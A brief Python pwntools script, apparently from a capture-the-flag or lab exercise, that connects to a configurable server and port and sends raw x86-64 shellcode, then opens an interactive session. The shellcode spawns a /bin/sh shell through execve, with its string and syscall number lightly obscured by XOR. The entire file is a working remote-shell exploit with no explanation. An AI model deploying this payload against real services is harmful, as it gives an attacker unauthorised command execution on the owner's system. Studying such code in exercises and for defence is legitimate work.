from pwn import *

#To change
SERVER = "127.0.0.1"
PORT = 55000

payload = b"\x48\xbf\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\x83\xf7\xff\x57\x48\x89\xe7\x50\x48\x89\xc6\x48\x89\xc2\xb8\x3a\x00\x00\x00\x48\x83\xf0\x01\x0f\x05"

p = remote(SERVER, PORT)
p.sendline(payload)

p.interactive()